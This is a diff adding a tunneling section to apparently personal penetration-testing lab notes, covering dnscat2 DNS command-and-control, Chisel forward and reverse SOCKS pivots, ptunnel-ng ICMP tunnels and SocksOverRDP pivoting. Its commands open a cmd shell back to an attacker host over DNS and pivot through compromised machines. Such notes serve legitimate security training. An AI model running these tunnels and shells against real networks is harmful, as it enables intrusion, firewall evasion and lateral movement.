@@ -645,6 +645,7 @@ nmap -v -sV -p3389 10.10.20.3 -A -Pn
 | 1   | 10.10.10.2/24          |                            |                             |
 | 2   |                        | 10.10.50.2/24              |                             |
 | 3   |                        | 172.10.20.2/24             | 172.10.20.3/24              |
+
 And an External Network at 10.10.40.0
 
 We will take the scenario above, where we have a web server on our internal network (`172.10.20.135`), and we want to access that using the rpivot proxy.
@@ -734,3 +735,414 @@ Now we can connect to the 8080 port of the Windows machine (Windows-based pivot 
 ```
 xfreerdp /v:$IpInterface1:8080 /u:$username /p:$password
 ```
+
+
+## Tunneling
+
+### DNS tunneling with Dnscat2 
+
+[Dnscat2](https://github.com/iagox86/dnscat2) is a tunneling tool that uses DNS protocol to send data between two hosts. It uses an encrypted `Command-&-Control` (`C&C` or `C2`) channel and sends data inside TXT records within the DNS protocol.
+
+> There is a powershell version for the dnscat2 client: [https://github.com/lukebaggett/dnscat2-powershell](https://github.com/lukebaggett/dnscat2-powershell)
+
+dnscat2 comes in two parts: the client and the server.
+
+- The client is designed to be run on a compromised machine. When you run the client, you typically specify a domain name. All requests will be sent to the local DNS server, which are then redirected to the authoritative DNS server for that domain (which you, presumably, have control of).
+- The server is designed to be run on an [authoritative DNS server](https://github.com/iagox86/dnscat2/blob/master/doc/authoritative_dns_setup.md). 
+
+
+>dnscat2 strives to be different from other DNS tunneling protocols by being designed for a special purpose: command and control. It can tunnel any data, with no protocol attached. Which means it can upload and download files, it can run a shell, and it can do those things well. It can also potentially tunnel TCP, but that's only going to be added in the context of a pen-testing tool (that is, tunneling TCP into a network), not as a general purpose tunneling tool.
+
+
+**1.** Install it in the attacker machine kali:
+
+```shell-session
+ git clone https://github.com/iagox86/dnscat2.git
+
+
+cd dnscat2/server/
+sudo gem install bundler
+sudo bundle install
+```
+
+
+**2.** Start the dnscat2 server by executing the dnscat2 file.
+
+```shell-session
+ ./dnscat2 --dns server=x.x.x.x,port=53
+
+sudo ruby dnscat2.rb --dns host=$ipAttackerMachine,port=53,domain=inlanefreight.local --no-cache
+```
+
+
+After running the server, it will provide us the secret key, which we will have to provide to our dnscat2 client on the Windows host so that it can authenticate and encrypt the data that is sent to our external dnscat2 server:
+
+```shell-session
+New window created: 0
+dnscat2> New window created: crypto-debug
+Welcome to dnscat2! Some documentation may be out of date.
+
+auto_attach => false
+history_size (for new windows) => 1000
+Security policy changed: All connections must be encrypted
+New window created: dns1
+Starting Dnscat2 DNS server on 10.10.14.18:53
+[domains = inlanefreight.local]...
+
+Assuming you have an authoritative DNS server, you can run
+the client anywhere with the following (--secret is optional):
+
+  ./dnscat --secret=0ec04a91cd1e963f8c03ca499d589d21 inlanefreight.local
+
+To talk directly to the server without a domain name, run:
+
+  ./dnscat --dns server=x.x.x.x,port=53 --secret=0ec04a91cd1e963f8c03ca499d589d21
+
+Of course, you have to figure out <server> yourself! Clients
+will connect directly on UDP port 53.
+
+```
+
+
+**3.** Depending on if we are attacking a windows or a linux machine, we need to use a dnscat2 version for linux or for windows.
+
+- Linux: the original dnscat2 
+- Windows: [https://github.com/lukebaggett/dnscat2-powershell](https://github.com/lukebaggett/dnscat2-powershell)
+
+In this case our attacked machine 1 is a windows machine so we will install dnscat 2 powershell version for clients.
+
+Installation:
+
+```
+# In the attacker machine, download the repo:
+git clone https://github.com/lukebaggett/dnscat2-powershell.git
+
+# Then, copy the dnscat2.ps1 file to the windows victim machine. For that use any of the file transfer techniques.
+
+# Once copied, install it in the windows machine
+Import-Module .\dnscat2.ps1
+```
+
+
+**4.** After dnscat2.ps1 is imported, we can use it to establish a tunnel with the server running on our attack host. We can send back a CMD shell session to our server.
+
+```powershell-session
+Start-Dnscat2 -DNSserver $ipAttackerMachine -Domain domain.local -PreSharedSecret $secret -Exec cmd 
+
+# $secret is obtained from the server launched in the kali machne.
+```
+
+**5.** In the server launched from the kali machine you will see:
+
+```shell-session
+New window created: 1
+Session 1 Security: ENCRYPTED AND VERIFIED!
+(the security depends on the strength of your pre-shared secret!)
+
+dnscat2>
+```
+
+
+**6.** Dnscat2 cheat sheet commands:
+
+```
+# Listing dnscat2 Options
+?
+
+# Interact with sessions and move further in a target environment on engagements
+window -i 1
+
+# And you will obtain the shell. But careful, it goes very slow as it is dns 
+```
+
+
+### SOCKS5 Tunneling with Chisel
+
+#### Chisel pivot
+
+[Chisel](https://github.com/jpillora/chisel) is a TCP/UDP-based tunneling tool written in [Go](https://go.dev/) that uses HTTP to transport data that is secured using SSH. `Chisel` can create a client-server tunnel connection in a firewall restricted environment. 
+
+This can allow us to pivot from a reachable network segment to a different network segment. For that, we will use the compromised machine (Ubuntu) as our Chisel server, listing on port 1234:
+
+| NIC | Attacker machine: kali | Compromised machine Ubuntu | Target: A webserver                                                                          |
+| --- | ---------------------- | -------------------------- | -------------------------------------------------------------------------------------------- |
+| 1   | 10.10.10.2/24          | 10.10.10.3/24              |                                                                                              |
+| 2   |                        | 172.16.5.10/23             | Webserver located at the network range 172.16.5.0/23 with a Domain Controller at 172.16.5.19 |
+
+**1.** Install chisel: 
+
+```shell-session
+#########
+# In the attacker machine
+#######
+git clone https://github.com/jpillora/chisel.git
+
+cd chisel
+go build
+
+
+# It can be helpful to be mindful of the size of the files we transfer onto targets on our client's networks, not just for performance reasons but also considering detection.
+# You can run `go build -ldflags="-s -w"` and reduce it to 7.5MB (where `-s` is “Omit all symbol information from the output file” or strip, and `-w` is “Omit the DWARF symbol table”).
+go build -ldflags="-s -w"
+```
+
+**2.** Once the binary is built, we can use SCP to transfer it to the target pivot host.
+
+```shell-session
+#########
+# In the attacker machine
+#######
+scp chisel ubuntu@10.10.10.3:~/
+
+# And connect to the machine
+ssh ubuntu@10.10.10.3
+```
+
+
+**3.** Run the Chisel Server on the Pivot Host, the ubuntu Attacked machine:
+
+```shell-session
+#########
+# In the Ubuntu compromised machine, our Pivot Host
+#######
+
+./chisel server -v -p 1234 --socks5
+```
+
+The Chisel listener will listen for incoming connections on port 1234 using SOCKS5 (--socks5) and forward it to all the networks that are accessible from the pivot host. In our case, the pivot host has an interface on the 172.16.5.0/23 network, which will allow us to reach hosts on that network.
+
+**4.** Connect to the chisel server
+
+```
+#########
+# In the attacker machine
+#######
+./chisel client -v 10.10.10.3:1234 socks
+```
+
+Results:
+
+```shell-session
+# client: Connecting to ws://10.10.10.3:1234
+# client: tun: proxy#127.0.0.1:1080=>socks: Listening
+# client: tun: Bound proxies
+# client: Handshaking...
+# client: Sending config
+# client: Connected (Latency 120.170822ms)
+# client: tun: SSH connected
+```
+
+The Chisel client has created a TCP/UDP tunnel via HTTP secured using SSH between the Chisel server and the client and has started listening on port 1080.
+
+**5.** Now we can modify our proxychains.conf file located at /etc/proxychains4.conf and add 1080 port at the end so we can use proxychains to pivot using the created tunnel between the 1080 port and the SSH tunnel.
+
+```shell-session
+# Edit the proxychains conf file
+sudo nano /etc/proxychains4.conf
+
+# Add the line `socks5 127.0.0.1 1080`
+```
+
+**6.** Now if we use proxychains with RDP, we can connect to the DC on the internal network through the tunnel we have created to the Pivot host.
+
+```shell-session
+proxychains xfreerdp /v:172.16.5.19 /u:$username /p:$password
+```
+
+
+#### Chisel Reverse Pivot
+
+In the previous example, we used the compromised machine (Ubuntu) as our Chisel server, listing on port 1234. Still, there may be scenarios where firewall rules restrict inbound connections to our compromised target. In such cases, we can use Chisel with the reverse option.
+
+| NIC | Attacker machine: kali | Compromised machine Ubuntu | Target: A webserver                                                                          |
+| --- | ---------------------- | -------------------------- | -------------------------------------------------------------------------------------------- |
+| 1   | 10.10.10.2/24          | 10.10.10.3/24              |                                                                                              |
+| 2   |                        | 172.16.5.10/23             | Webserver located at the network range 172.16.5.0/23 with a Domain Controller at 172.16.5.19 |
+
+**1.** Start the Chisel Server on our attacker machine or attacker host:
+
+```shell-session
+#########
+# In the attacker machine
+#######
+sudo ./chisel server --reverse -v -p 1234 --socks5
+```
+
+
+**2.** Then we connect from the Ubuntu (pivot host) to our attacker machine (or attack host), using the option R:socks
+
+```shell-session
+#########
+# In the Ubuntu compromised machine, our Pivot Host
+#######
+/chisel client -v 10.10.10.2:1234 R:socks
+
+```
+
+Results:
+
+```shell-session
+# client: Connecting to ws://10.10.10.2:1234
+# client: Handshaking...
+# client: Sending config
+# client: Connected (Latency 120.170822ms)
+# client: tun: SSH connected
+```
+
+**3.** Now we can modify our proxychains.conf file located at /etc/proxychains4.conf and add 1080 port at the end so we can use proxychains to pivot using the created tunnel between the 1080 port and the SSH tunnel.
+
+```shell-session
+# Edit the proxychains conf file
+sudo nano /etc/proxychains4.conf
+
+# Add the line `socks5 127.0.0.1 1080`
+```
+
+**4.** Now if we use proxychains with RDP, we can connect to the DC on the internal network through the tunnel we have created to the Pivot host.
+
+```shell-session
+proxychains xfreerdp /v:172.16.5.19 /u:$username /p:$password
+```
+
+
+### ICMP tunneling with SOCKS 
+
+ICMP tunneling encapsulates your traffic within ICMP packets containing echo requests and responses.
+
+**Important:** ICMP tunneling would only work when ping responses are permitted within a firewalled network. 
+
+We will use the [ptunnel-ng](https://github.com/utoni/ptunnel-ng) tool to create a tunnel between our Ubuntu server and our attack host. Once a tunnel is created, we will be able to proxy our traffic through the `ptunnel-ng client`. We can start the `ptunnel-ng server` on the target pivot host.
+
+**1.** Install ptunnel-ng in the attacker machine:
+
+```shell-session
+#########
+# In the attacker machine
+#######
+git clone https://github.com/utoni/ptunnel-ng.git
+
+# Once the ptunnel-ng repo is cloned to our attack host, we can run the autogen.sh script located at the root of the ptunnel-ng directory. Building Ptunnel-ng with Autogen.sh
+sudo ./autogen.sh 
+
+# Another way to build the ptunnel-ng binary
+sudo apt install automake autoconf -y
+cd ptunnel-ng/
+sed -i '$s/.*/LDFLAGS=-static "${NEW_WD}\/configure" --enable-static $@ \&\& make clean \&\& make -j${BUILDJOBS:-4} all/' autogen.sh
+./autogen.sh
+
+# After running autogen.sh, ptunnel-ng can be used from the client and server-side. We will now need to transfer the repo from our attack host to the target host
+scp -r ptunnel-ng ubuntu@$ipUbuntuCompromisedMachine:~/
+
+# Connect to the ubuntu
+ssh ubuntu@$ipUbuntuCompromisedMachine
+```
+
+
+**2.** Start the ptunnel-ng Server on the Target Host
+
+```shell-session
+#########
+# In the Ubuntu compromised machine, our Pivot Host
+#######
+sudo ./ptunnel-ng/src/ptunnel-ng -r$ipUbuntuCompromisedMachine -R22
+```
+
+**3.** With the ptunnel-ng ICMP tunnel successfully established, we can attempt to connect to the target using SSH through local port 2222 (-p2222).
+
+```shell-session
+#########
+# In the attacker machine
+#######
+
+# Connecting to ptunnel-ng Server from Attack Host
+sudo ./src/ptunnel-ng -p$ipUbuntuCompromisedMachine -l2222 -r$ipUbuntuCompromisedMachine -R22
+```
+
+
+Now we can:
+
+- OR Tunnel an SSH connection through an ICMP Tunnel
+
+```
+ssh -p2222 -lubuntu 127.0.0.1
+```
+
+- OR  use proxychains with nmap to scan targets on the internal network. 
+
+```shell-session
+# First, enable Dynamic Port Forwarding over SSH
+ssh -D 9050 -p2222 -lubuntu 127.0.0.1
+
+# Now we can use proxychains with nmap
+proxychains nmap -sV -sT 172.16.5.19 -p3389
+```
+
+- OR  use proxychains with RDP to connect to the machine in the other network range:
+
+```shell-session
+# First, enable Dynamic Port Forwarding over SSH
+ssh -D 9050 -p2222 -lubuntu 127.0.0.1
+
+# Now we can use proxychains with nmap
+proxychains xfreerdp  /u:$user /p:$password /v:172.16.5.19
+```
+
+
+### RDP and SOCKS Tunneling with SocksOverRDP
+
+There are often times during an assessment when we may be limited to a Windows network and may not be able to use SSH for pivoting. We would have to use tools available for Windows operating systems in these cases. [SocksOverRDP](https://github.com/nccgroup/SocksOverRDP) is an example of a tool that uses `Dynamic Virtual Channels` (`DVC`) from the Remote Desktop Service feature of Windows. DVC is responsible for tunneling packets over the RDP connection. Some examples of usage of this feature would be clipboard data transfer and audio sharing. However, this feature can also be used to tunnel arbitrary packets over the network. We can use `SocksOverRDP` to tunnel our custom packets and then proxy through it. We will use the tool [Proxifier](https://www.proxifier.com/) as our proxy server.
+
+
+| NIC | Attacker machine: kali | Attacked machine 1: Windows | Attacked machine 2: Windows | Attacked machine 3: Windows |
+| --- | ---------------------- | --------------------------- | --------------------------- | --------------------------- |
+| 1   | 10.10.10.2             | 10.10.10.3                  |                             |                             |
+| 2   |                        | 172.16.5.150                | 172.16.5.19                 |                             |
+| 3   |                        |                             | 172.16.6.150                | 172.16.6.155                |
+
+Our goal will be reaching the attacked machine 3. 
+
+**1.** First, we download appropriate binaries to our kali attack host:
+
+1. [SocksOverRDP x64 Binaries](https://github.com/nccgroup/SocksOverRDP/releases)
+    
+2. [Proxifier Portable Binary](https://www.proxifier.com/download/#win-tab)
+
+
+**2.** **Attacking machine 1**
+
+Connect to the target using xfreerdp and transfer SocksOverRDPx64.zip to the Windows target machine. Once done, unzip it.
+
+From the Windows machine 1, we will then need to load the SocksOverRDP.dll (located within the SocksOverRDP-x64 folder) using regsvr32.exe. **Do it as Admin**
+
+```cmd-session
+regsvr32.exe SocksOverRDP-Plugin.dll
+```
+
+**3.** **Attacking machine 2**
+
+Now, from the machine 1, we can connect to machine 2  over RDP using `mstsc.exe`. Windows-R and enter mstsc.exe. Enter the machine 2 IP 172.16.5.19, username and password. When doing so,  we should receive a prompt that the SocksOverRDP plugin is enabled. And we will have access to the machine 2 from the RDP connection done from machine 1.
+
+**4.** **Attacking machine 3**
+
+Now we need to transfer SocksOverRDPx64.zip or just the SocksOverRDP-Server.exe to machine 2, 172.16.5.19.  You can just try to copy paste it.
+
+
+When done, **start SocksOverRDP-Server.exe with Admin privileges** in machine 2.
+
+When we go back to our foothold target (machine 1) and check with Netstat, we should see our SOCKS listener started on 127.0.0.1:1080.
+
+```cmd-session
+netstat -antb | findstr 1080
+```
+
+Also, we transfer from our kali machine to the machine 1, the proxifier portable. Once done we configure it in machine 1 to forward all our packets to 127.0.0.1:1080. Use SOCKS5 as protocol. 
+
+```
+Open proxifier and go to Profile > Proxy server. Click on "Add..."
+```
+
+With Proxifier configured and running, we can **start mstsc.exe**, and it will use Proxifier to pivot all our traffic via 127.0.0.1:1080, which will tunnel it over RDP to 172.16.5.19, which will then route it to 172.16.6.155 using SocksOverRDP-server.exe.
+
+So, now Windows-R and mstsc.exe to connect to machine 3 with username and password. If there are some problems with the connection, play in RDP program with the tab EXPERIENCE.
+
+
